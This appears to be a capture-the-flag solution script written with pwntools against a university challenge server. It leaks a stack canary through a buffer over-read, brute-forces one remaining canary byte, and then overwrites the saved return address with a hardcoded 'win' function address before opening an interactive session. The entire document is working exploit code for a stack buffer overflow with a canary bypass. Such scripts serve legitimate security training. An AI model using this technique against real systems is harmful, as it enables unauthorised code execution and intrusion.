from pwn import *

HOST = 'cyberchallenge.disi.unitn.it'
PORT = 50300
WIN_ADDRESS = 0x00000000004011f6
OFFSET = 72  

p = remote(HOST, PORT)

p.recvuntil(b'Exit\n')
p.sendline(b'1')
p.send(b"A" * (OFFSET + 1))
p.recvuntil(b"A" * (OFFSET + 1))

canary = b"\x00" + p.recv(6)

log.info(f"Canary: {canary}, {canary.hex()}")

for guess in range(255):
    print("Byte: ", p8(guess))
    payload = b"A" * OFFSET + canary + p8(guess)
    p.recvuntil(b'Exit\n')
    p.sendline(b'2')
    p.sendline(payload)
    
    msg = ""
    msg = p.recvuntil(b'stack', timeout=0.5)
    if b"stack" not in msg:
        canary += p8(guess)
        print("Found Canary byte: ",p8(guess))
        break
    
log.info(f"Canary: {canary}, {canary.hex()}")

payload = b"A" * OFFSET + canary + b"B" * 8 + p64(WIN_ADDRESS)
p.recvuntil(b'Exit\n')
p.sendline(payload)
p.recvuntil(b'Exit\n')
p.sendline(b'3')

msg = p.recvall()
print(msg)

p.interactive()
